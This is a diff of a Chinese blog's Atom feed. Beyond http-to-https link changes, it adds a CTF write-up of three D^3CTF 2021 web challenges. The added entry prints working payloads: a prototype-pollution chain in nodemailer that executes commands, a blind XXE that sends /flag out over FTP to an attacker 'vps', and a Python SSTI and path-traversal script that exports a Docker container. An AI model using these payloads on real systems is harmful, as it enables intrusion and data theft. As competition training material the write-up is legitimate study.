@@ -3,11 +3,11 @@
   <title>gml&#39;s blog</title>
   
   <subtitle>不念过往，不畏将来。</subtitle>
-  <link href="http://igml.top/atom.xml" rel="self"/>
+  <link href="https://igml.top/atom.xml" rel="self"/>
   
-  <link href="http://igml.top/"/>
-  <updated>2021-01-19T07:06:20.067Z</updated>
-  <id>http://igml.top/</id>
+  <link href="https://igml.top/"/>
+  <updated>2021-03-08T11:29:05.722Z</updated>
+  <id>https://igml.top/</id>
   
   <author>
     <name>gml</name>
@@ -17,9 +17,36 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>2021 D^3CTF Web 部分wp</title>
+    <link href="https://igml.top/2021/03/08/2021-D3CTF/"/>
+    <id>https://igml.top/2021/03/08/2021-D3CTF/</id>
+    <published>2021-03-08T08:43:36.000Z</published>
+    <updated>2021-03-08T11:29:05.722Z</updated>
+    
+    <content type="html"><![CDATA[<p>周末两天几乎都在肝D^3CTF，本来队里打的人就不多，题质量还很高而且题量也不少，所以打的非常累。 Web 基本一人单搞，后来把队里逆向（全栈）大佬拉来一起搞 shellgen，浪费了不少时间。</p><p>最后成绩是第四名（果然是 Redbud-Misc 队，AK Misc），脑王yyds，这里记录下三道Web的wp。</p><a id="more"></a><img src="/2021/03/08/2021-D3CTF/image-20210308190727832.png" alt="image-20210308190727832" style="zoom:50%;"><h2 id="8-bit-pub"><a href="#8-bit-pub" class="headerlink" title="8-bit pub"></a>8-bit pub</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先要登陆admin。</p><p>传入的username和password如果用json提交，可以传入dict。如果password是个dict，会把key名字作为列查询，构造Payload: </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">&quot;password&quot;</span>:&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>即可登陆admin。</p><p>进入admin，可以发邮件的功能，使用了 nodemailer。前面使用了shvl 来进行赋值，猜测有原型链污染。查看版本，发现 shvl 是 2.0.2 的版本，原型链污染被修复：</p><p><img src="/2021/03/08/2021-D3CTF/JNoBlTqeMr3JZA1oWU54M_ZWo7CrJ01GspHHPdgkoBit9Jd1RIl30S0BhFNLpxYKa0hWyhFGkCaQZfFqyqUrYTXuNbaRUZaiyD5SviOf6b1C4oXQBB6V7Gev5wXD7Yb7rY0L4jqO.png" alt="img"></p><p>但是仅仅过滤了关键字__proto__，可以使用 prototype 绕过。</p><p>原始的利用：</p><img src="/2021/03/08/2021-D3CTF/mPACSo-7KERY1x58_2hFnEDuja_G_jbRZgeGU7p5yQilELEqAMww0lggbZimkRLhhmUH4g-bsrMWeH0lmqWd1SsWdH12nk5EsZhNWf6_iTNpNV8EXBROgKtzAtSpLKJx-xDqbfmI.png" alt="img" style="zoom:50%;"><p>可以使用prototype绕过，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.constructor.prototype.path</span><br></pre></td></tr></table></figure><p>接下来需要在 nodemailer 里找rce的点，搜关键字发现了存在一个命令执行的点：</p><img src="/2021/03/08/2021-D3CTF/w32rGyw-n0Nmg7NWPZ9rc4HHJvqoGbbhZ3Bx8maQxKm8slrulLKGXD-9DWHISq8CINqN58Gv_aURe84W5m6nZdOyYCP0ETMWAYIpwP5P0mcqAjLZTSb_lYkx5RJKjhx11R5_5WSB.png" alt="img" style="zoom:50%;"><p>存在调用：</p><img src="/2021/03/08/2021-D3CTF/6wUGhVotlC5QKgc-kbVWXiSXBRYgXNGAC7GqDhP2MC45tiYKA3A6r7c7cahi_uXmV5sLRc9MKyPZrjeCjeSfe4sZ_gOFyJ5IPIZoakVWrOHMh0hnmWupUtJZcdrimsHvpQYmrVG2.png" alt="img" style="zoom:50%;"><p>原本是执行sendmail的，可以考虑污染 this.path，就可以rce了。追踪源码，寻找 this.path 的赋值：</p><p><img src="/2021/03/08/2021-D3CTF/EKV5IETE1fYX1XFBlQyoNuFoT3H-Ull4syXvhRw60lxJI2LtlLwq8jjBOcjhx6Lpg_nwsrAJZtS_w-iZZkY4cY7yuSK8w9tubMJYUuy_RJbzCXPEHoiihk9r7JyroiWBDe-d_HQ0.png" alt="img"></p><p>Options.path 赋值，那么我们直接向 Object 里污染一个path，就可以了。</p><p>但是要使用 sendmail，在nodemailer/lib/nodemailer.js还有一处if判断：</p><img src="/2021/03/08/2021-D3CTF/wEH2DVHzBS7_dLhM5JeJokDRaQ07wmttykDGHYDTjfxTd8uTrIXGmNIQgTrxJ_hsYMGUoZrHoFfhTtkJ7zhnPOClPyUWM4Z6djK52EgDqbqKg2VEY9WzFg5GPb8P4dw-tVy5yUxe.png" alt="img" style="zoom:50%;"><p>所以还要污染一个pool为0，污染一个sendmail为1。</p><p>最后 spawn 执行命令，不支持管道符之类的，所以 /readflag &gt; /tmp/gml 这种无法直接执行。</p><p>注意到有args，可以为命令附带参数。看看这个args怎么赋值的：</p><img src="/2021/03/08/2021-D3CTF/p-xOu8p_m0U7fj2F8F0ccBoj5nL2ZsD71bKQzWY2zYANynVRwP5Noie7m8PS8lQW5cZVLfeGkuHkaZc8OnIpoKro1em10kdzcH49H4Xx8gQOqvghyLcjmlma-emOhnYnq2eugIJF.png" alt="img" style="zoom: 50%;"><p>也可以进行污染，但是在执行前，加了个 -i 参数：</p><p><img src="/2021/03/08/2021-D3CTF/zP-1m-vQp7DdOdNOK8HytgVbaB7efTFC8k8ITjZ7Y-xdnMwCBeB2mqmhVX_Mgm19PPSYUIbsULS239jCt25DSlBG5LoKwMaD4x061o6imHCKNT_fBCFxSWadKtAeQ6lLB4Aw-EJa.png" alt="img"></p><p>尝试 curl -i，wget -i 之类的，但是无法把命令执行的结果带出。</p><p>最后测试可以 bash -i -c 这样：</p><p><code>spawn(&#39;bash&#39;,[&#39;-i&#39;,&#39;-c&#39;,&#39;ls &gt; /tmp/gml&#39;]);</code></p><p>本地测试成功执行。然后发邮件功能我们可以指定附件，把 /tmp/gml 通过邮件给发过来。</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>首先原型链污染，执行命令，payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;subject&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;text&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;a.constructor.prototype.path&quot;</span>:<span class="string">&quot;sh&quot;</span>,<span class="attr">&quot;a.constructor.prototype.pool&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;a.constructor.prototype.sendmail&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;a.constructor.prototype.args&quot;</span>:[<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/readflag&gt;/tmp/gml&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p>把flag写进/tmp/flag。再通过发邮件附件的形式，把flag给我发过来。翻阅文档发送附件的方法，payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;to&quot;</span>:<span class="string">&quot;xxx@qq.com&quot;</span>,<span class="attr">&quot;subject&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;text&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;attachments&quot;</span>:[&#123;<span class="attr">&quot;filename&quot;</span>:<span class="string">&quot;gml.txt&quot;</span>,<span class="attr">&quot;path&quot;</span>:<span class="string">&quot;/tmp/gml&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/08/2021-D3CTF/5aiWUmG8S1x0uEsU1N-VSaQOwiXtTwL6_lzQIc4YAJWEKH-55wo9pZECJfk4hkUkc5NvCWRofRTI3ck-sJX2vPSvjpuVFh-YzknIe8izOhaGqOJ0KHxNtkj1YMZkpV3cim5j170D.png" alt="img"></p><h2 id="Real-cloud-storage"><a href="#Real-cloud-storage" class="headerlink" title="Real_cloud_storage"></a>Real_cloud_storage</h2><p>上传文件，往fn10085032.serverless.cloud.d3ctf.io发包，可以指定endpoint 与backet。</p><p>测试发现可以指定成任意域。设置指定成自己的服务器，观察发来的上传包：</p><p><img src="/2021/03/08/2021-D3CTF/image-20210308173200850.png" alt="image-20210308173200850"></p><p>Google 一下 nos-sdk-java，发现源码：<a href="https://github.com/NetEase-Object-Storage/nos-java-sdk">https://github.com/NetEase-Object-Storage/nos-java-sdk</a></p><p>源码审计，因为我们只有一个upload功能，只有那几个参数，所以关注upload功能的相关源码，但没啥利用的。</p><p>尝试模仿这个包，我们自己构造向 oss 上传文件的包：</p><p><img src="/2021/03/08/2021-D3CTF/IRZvn_IUWBeTQas6Owk9_H8WjyWWDS_I20bWZnyn0lOGG5Br8qCwBWczaNuyTY9igJ5YTYcjWfFtg1iwej3uOtehAJJo17-Dyj4G6iZEF71eBDWlrq-GT62Emnyda78v5_5Jhl-r.png" alt="img"></p><p>返回错误。但是可以看到返回是 xml。上传的 client 是 java，猜测这个 client 会在向 oss 上传后解析返回的 xml 。</p><p>翻阅源码，果然有相关的操作。考虑 xxe 攻击，我们控制返回的response包含 xxe 的payload，使用盲打xxe。</p><p>使用 <a href="https://requestrepo.com/">https://requestrepo.com/</a>，方便控制response，response的 paylaod：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xmlrootname</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps/ext.dtd&quot;</span>&gt;</span>%aaa;%ccc;%ddd;]&gt;</span></span><br></pre></td></tr></table></figure><p>服务器上的 ext.dtd：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">bbb</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ccc</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &#x27;ftp://vps:2121/%bbb;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/08/2021-D3CTF/Cd_JSMXDgkuTEPvF09sjnvldT5dRBQ4ovtR3ED0IhLEVP6d6_emdQpAm351h-mxnmC6nyj3_5g0HEvDV9zQChhHFMjIT3TfZZgPJcQd6-cjjoWEPvTl-vnbIsEtd2voMTfJTWiaT.png" alt="img"></p><p><img src="/2021/03/08/2021-D3CTF/CamNVR72syzwTWwiRQJ5OyD1S61zzu9gMyqPOJnygEjqDMlY-R-zHKaHOHTKhelAdQ-rIwVo0GbfsoNKmB5htALIrIeEBzx1p9QY28drCfXuTH9GunkBENjRtSiNPxrTpBrVdvdg.png" alt="img"></p><h2 id="Shellgen"><a href="#Shellgen" class="headerlink" title="Shellgen"></a>Shellgen</h2><p>跟 misc 那道题逻辑基本差不多，就是需要 rce。</p><p>源代码里发现部分伪代码，可以看到python和php的执行都是在docker container里完成的。其中python 使用了 Mount 来挂载目录：</p><p><img src="/2021/03/08/2021-D3CTF/f2prKZ6YUJk2oY99Gj2VVPaAbDzGW0DNp072XsKLOPO4oGLKOlq_GcOvRa6zWmO8blk_0vwq0AaN9-XWpAQLqnAsiiqi-oXd6lXK2aHnjeUuXAsxZ4Mzt-bABu4j85zZoJcGkoMw.png" alt="img"></p><p>运行入容器指定了 read_only。</p><p>本来以为挂载目录只读，就没想用这个python写文件的思路，但是后来本地测试一下发现竟然可以写，并且可以写入外部host中，耽误了很久。赛后问了出题人，这个只是root filesystem只读，并不是所有mount都只读。</p><p>/result 处使用了 render_template，那么如果渲染的result.html文件可控，那么就可以换成正常ssti的payload，就可以rce。</p><p>因为创建目录是 token 直接 os.path.join 拼接，所以可以使用 ../穿越。需要注意 render_template 传入的模版路径如果包含 <code>..</code> 就会报错。</p><p>整个攻击的逻辑有点绕：</p><p>（1）首先我们 token 传入一个随机的token: gml/def，code写什么都行，submit。这样服务器会创建 workdir/gml/def/gen.py以及templates/gml/def/result.html，记得保留下这个session的cookie。</p><p>（2）第二步，我们submit的token是../templates/gml，这样服务器会创建 workdir/../templates/gml/gen.py，以及workdir/../templates/gml/result.html（即 templates/gml/result.html）。注意这时mount的目录是 workdir/../templates/gml，即templates/gml -&gt; /opt，那么code的内容写成向 /opt/def/result.html 写入数据，这样我们实际是向服务器的 templates/gml/def/result.html 写入了数据。</p><p>（3）最后带着第一步保留的token为gml/def 的cookie 去访问 /result，触发render_template，执行命令。</p><p>这里涉及一些detail:</p><p>（1）在第一步时，注意submit后不要带着token是gml/def的session去访问 /result 去check结果，因为 render_template 有缓存，后面即使我们更改了 result.html，也不会重新渲染了。</p><p>（2）第一步submit后，需要等一下，让服务器运行完python，把result.html写入后再进行第二部，否则如果第二步写入的比第一步的早，那么result.html会被第一步写入内容覆盖。</p><p>（3）之所以第一步的token包含了一层路径，是为了防止后面干扰。假如第一步的token是gml，那么第二步里，服务器本身就会向template/gml/result.html里写，python脚本再往里写，可能会存在干扰。但如果加了一层路径，就可以避免这个问题。</p><p>在做这个题的时候，遇到了很多坑。比如刚放出这个题的时候，无论让python输出什么，都返回 detected，没有过wrong answer的回显，然后过了几个小时，就好了… 后面尝试写文件，更玄学，感觉逻辑没有问题，但是check的结果显示没写进去，去找出题人反馈，出题人进题目环境说已经写进去了… 不知道我们这里为什么访问 /result check 不到。</p><p>最后干脆写了个循环脚本，一直在尝试攻击，python 的code也写成了循环写入，终于是做到了跑几次能rce一次（反弹shell无果，curl与ping请求都非常之卡，赛后问了下是香港反代的原因）。</p><p>hint提示flag在另一个container里，也弹不了shell，题目删了 docker 命令，所以仿照题目代码，使用dockerclient 来与docker交互，发现了名为 d3ctf-shellgen-flag 的container。执行什么 bash，sh，pwd 各种命令都显示找不到文件。最后直接写脚本把这个container拖下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, random, base64, requests</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randid</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">10</span>**<span class="number">14</span>, <span class="number">10</span>**<span class="number">15</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">sess</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = sess.get(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/result&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wait for a sec&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> r.text, time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">py = <span class="string">b&#x27;&#x27;&#x27;from docker import DockerClient, types</span></span><br><span class="line"><span class="string">client = DockerClient()</span></span><br><span class="line"><span class="string">print(client.containers.list())</span></span><br><span class="line"><span class="string">x=client.containers.get(&#x27;d67a893292&#x27;)</span></span><br><span class="line"><span class="string">print(x.id,x.image,x.name,x.status)</span></span><br><span class="line"><span class="string">bits,stat=x.get_archive(&#x27;/&#x27;)</span></span><br><span class="line"><span class="string">print(stat)</span></span><br><span class="line"><span class="string">f=open(&#x27;/tmp/export.tar&#x27;,&#x27;wb&#x27;)</span></span><br><span class="line"><span class="string">for chunk in bits:</span></span><br><span class="line"><span class="string">    f.write(chunk)</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;echo %s | base64 -d | python3&#x27;</span> % base64.b64encode(py).decode()</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">&#x27;echo %s | base64 -d | bash | base64&#x27;</span> % base64.b64encode(cmd.encode()).decode()</span><br><span class="line"> </span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(100):</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        open(&#x27;/opt/def/result.html&#x27;,&#x27;w&#x27;).write(&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(\\&quot;__import__(&#x27;os&#x27;).popen(&#x27;  &#x27;&#x27;&#x27;</span> + cmd + <span class="string">&#x27;&#x27;&#x27; &#x27;).read()\\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;)</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        pass</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">print(code)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">id</span> = randid()</span><br><span class="line">    print(<span class="built_in">id</span>)</span><br><span class="line"> </span><br><span class="line">    s3 = requests.Session()</span><br><span class="line">    s3.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: randid(), <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;pass&#x27;</span>&#125;)</span><br><span class="line">    s1 = requests.Session()</span><br><span class="line">    s1.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: <span class="built_in">id</span> + <span class="string">&#x27;/def&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;print(&quot;&lt;?php &quot;,end=&quot;&quot;)&#x27;</span>&#125;)</span><br><span class="line">    s2 = requests.Session()</span><br><span class="line">    s2.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: <span class="string">&#x27;../templates/&#x27;</span> + <span class="built_in">id</span>, <span class="string">&#x27;code&#x27;</span>: code&#125;)</span><br><span class="line">    a, b = check(s3)</span><br><span class="line">    print(b)</span><br><span class="line">    c, d = check(s1)</span><br><span class="line">    print(d)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Wr0ng&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">        <span class="comment">#open(&#x27;out.tar&#x27;, &#x27;wb&#x27;).write(base64.b64decode(c))</span></span><br><span class="line">        print(base64.b64decode(c).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拖下来本地发现有个 /getflag，执行发现需要输入token，输入token得到了 flag，但是交上去不对…</p><p>猜测是不是必须要在远程跑，但是需要输入token，需要交互，想用<code>echo xx | /readflag</code>，但是发现 echo 都没有：</p><p><img src="/2021/03/08/2021-D3CTF/telegram-cloud-photo-size-5-6206472350153681829-y.jpg" alt="telegram-cloud-photo-size-5-6206472350153681829-y"></p><p>尝试逆向程序，发现生成flag的逻辑并没有涉及这么复杂，本地结果和远程结果应该是一样的。最后找出题人解决了flag错误的问题。</p>]]></content>
+    
+    
+    <summary type="html">D^3CTF &amp; AntCTF 题解</summary>
+    
+    
+    
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
+    
+    <category term="wp" scheme="https://igml.top/categories/CTF/wp/"/>
+    
+    
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
+    
+    <category term="wp" scheme="https://igml.top/tags/wp/"/>
+    
+    <category term="D^3CTF" scheme="https://igml.top/tags/D-3CTF/"/>
+    
+  </entry>
+  
+  <entry>
     <title>2021 *CTF Web 题解</title>
-    <link href="http://igml.top/2021/01/19/2021-starctf/"/>
-    <id>http://igml.top/2021/01/19/2021-starctf/</id>
+    <link href="https://igml.top/2021/01/19/2021-starctf/"/>
+    <id>https://igml.top/2021/01/19/2021-starctf/</id>
     <published>2021-01-19T06:30:02.000Z</published>
     <updated>2021-01-19T07:06:20.067Z</updated>
     
@@ -32,23 +59,23 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
-    <category term="wp" scheme="http://igml.top/tags/wp/"/>
+    <category term="wp" scheme="https://igml.top/tags/wp/"/>
     
   </entry>
   
   <entry>
     <title>2020 XCTF 华为云专场部分wp</title>
-    <link href="http://igml.top/2020/12/21/2020-XCTF-huawei-cloud/"/>
-    <id>http://igml.top/2020/12/21/2020-XCTF-huawei-cloud/</id>
+    <link href="https://igml.top/2020/12/21/2020-XCTF-huawei-cloud/"/>
+    <id>https://igml.top/2020/12/21/2020-XCTF-huawei-cloud/</id>
     <published>2020-12-21T10:45:02.000Z</published>
     <updated>2020-12-21T11:19:15.422Z</updated>
     
@@ -59,23 +86,23 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
-    <category term="huawei-cloud" scheme="http://igml.top/tags/huawei-cloud/"/>
+    <category term="huawei-cloud" scheme="https://igml.top/tags/huawei-cloud/"/>
     
   </entry>
   
   <entry>
     <title>2020 X-NUCA 决赛 ezwp</title>
-    <link href="http://igml.top/2020/12/08/2020-X-NUCA-FINAL/"/>
-    <id>http://igml.top/2020/12/08/2020-X-NUCA-FINAL/</id>
+    <link href="https://igml.top/2020/12/08/2020-X-NUCA-FINAL/"/>
+    <id>https://igml.top/2020/12/08/2020-X-NUCA-FINAL/</id>
     <published>2020-12-08T12:16:13.000Z</published>
     <updated>2020-12-09T07:16:57.474Z</updated>
     
@@ -87,23 +114,23 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
-    <category term="Wordpress" scheme="http://igml.top/tags/Wordpress/"/>
+    <category term="Wordpress" scheme="https://igml.top/tags/Wordpress/"/>
     
   </entry>
   
   <entry>
     <title>2020 GACTF writeup</title>
-    <link href="http://igml.top/2020/08/31/2020-GACTF/"/>
-    <id>http://igml.top/2020/08/31/2020-GACTF/</id>
+    <link href="https://igml.top/2020/08/31/2020-GACTF/"/>
+    <id>https://igml.top/2020/08/31/2020-GACTF/</id>
     <published>2020-08-31T06:22:46.000Z</published>
     <updated>2020-09-01T01:47:15.373Z</updated>
     
@@ -114,19 +141,19 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="wp" scheme="http://igml.top/categories/CTF/wp/"/>
+    <category term="wp" scheme="https://igml.top/categories/CTF/wp/"/>
     
     
-    <category term="CTF.wp" scheme="http://igml.top/tags/CTF-wp/"/>
+    <category term="CTF.wp" scheme="https://igml.top/tags/CTF-wp/"/>
     
   </entry>
   
   <entry>
     <title>2020 强网杯 writeup</title>
-    <link href="http://igml.top/2020/08/28/2020-qwb/"/>
-    <id>http://igml.top/2020/08/28/2020-qwb/</id>
+    <link href="https://igml.top/2020/08/28/2020-qwb/"/>
+    <id>https://igml.top/2020/08/28/2020-qwb/</id>
     <published>2020-08-28T08:30:49.000Z</published>
     <updated>2020-08-28T08:44:42.678Z</updated>
     
@@ -139,21 +166,21 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="wp" scheme="http://igml.top/categories/CTF/wp/"/>
+    <category term="wp" scheme="https://igml.top/categories/CTF/wp/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
   </entry>
   
   <entry>
     <title>2020 ciscn 初赛 writeup</title>
-    <link href="http://igml.top/2020/08/21/2020-ciscn/"/>
-    <id>http://igml.top/2020/08/21/2020-ciscn/</id>
+    <link href="https://igml.top/2020/08/21/2020-ciscn/"/>
+    <id>https://igml.top/2020/08/21/2020-ciscn/</id>
     <published>2020-08-21T02:28:13.000Z</published>
     <updated>2020-08-21T02:56:10.506Z</updated>
     
@@ -164,21 +191,21 @@
     
     
     
-    <category term="ciscn" scheme="http://igml.top/categories/ciscn/"/>
+    <category term="ciscn" scheme="https://igml.top/categories/ciscn/"/>
     
-    <category term="CTF" scheme="http://igml.top/categories/ciscn/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/ciscn/CTF/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="ciscn" scheme="http://igml.top/tags/ciscn/"/>
+    <category term="ciscn" scheme="https://igml.top/tags/ciscn/"/>
     
   </entry>
   
   <entry>
     <title>2020 Datacon 大数据安全分析比赛部分题目 内测笔记</title>
-    <link href="http://igml.top/2020/08/16/2020-Datacon/"/>
-    <id>http://igml.top/2020/08/16/2020-Datacon/</id>
+    <link href="https://igml.top/2020/08/16/2020-Datacon/"/>
+    <id>https://igml.top/2020/08/16/2020-Datacon/</id>
     <published>2020-08-16T14:27:26.000Z</published>
     <updated>2020-08-17T02:38:40.432Z</updated>
     
@@ -190,14 +217,14 @@
     
     
     
-    <category term="Datacon" scheme="http://igml.top/tags/Datacon/"/>
+    <category term="Datacon" scheme="https://igml.top/tags/Datacon/"/>
     
   </entry>
   
   <entry>
     <title>2020 SCTF 部分wp</title>
-    <link href="http://igml.top/2020/07/06/2020-SCTF/"/>
-    <id>http://igml.top/2020/07/06/2020-SCTF/</id>
+    <link href="https://igml.top/2020/07/06/2020-SCTF/"/>
+    <id>https://igml.top/2020/07/06/2020-SCTF/</id>
     <published>2020-07-06T03:56:38.000Z</published>
     <updated>2020-07-08T09:54:09.139Z</updated>
     
@@ -208,17 +235,17 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
   </entry>
   
   <entry>
     <title>2020 TCTF/0CTF 部分wp</title>
